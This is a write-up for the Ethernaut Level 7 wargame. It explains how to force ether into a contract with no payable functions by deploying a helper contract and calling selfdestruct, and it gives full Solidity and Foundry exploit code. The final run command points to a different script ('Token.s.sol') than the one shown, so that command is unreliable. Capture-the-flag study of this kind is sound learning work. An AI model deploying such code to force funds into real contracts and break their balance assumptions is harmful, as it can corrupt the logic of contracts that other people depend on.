# Ethernaut Level 7

---

Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```

It is an empty contract. Basically we need to somehow add balance to the contract address. Since there is no `receive()` and `fallback()` and any payable external ABI, we can't directly send transactions to increase the balance. What we will do instead is to create a new contract with some balances, self destruct it, and appoint the beneficiary to be this empty contract address. The balance will then go to the target.

`Destructible.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Destructable {
    address payable beneficiary;

    constructor(address payable _beneficiary) {
        beneficiary = _beneficiary;
    }

    receive() external payable {}

    function destruct() public {
        selfdestruct(beneficiary);
    }
}
```

In this contract, we use a payable address `beneficiary` to be the ultimate beneficiary of `selfdestruct()`. We also need a `receive()` function so that the contract is able to receive money and have a balance.

`Force.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Force} from "../src/Force.sol";
import {Destructable} from "../src/Destructable.sol";

contract ForceScript is Script {
    Force force = Force(0xXXXXXXXXXXXX);

    function run() external {
        vm.startBroadcast();
        Destructable destructable = new Destructable(payable(address(force)));
        address(destructable).call{value: 1 wei}("");
        destructable.destruct();
        vm.stopBroadcast();
    }
}
```

In the script, we can just send a small amount of money to the `Destructable` contract and call the `destruct()` function to self destruct the contract.

Run the command:

```bash
forge script script/Token.s.sol:TokenScript --rpc-url $SEPOLIA_RPC_URL$ --account default --broadcast
```

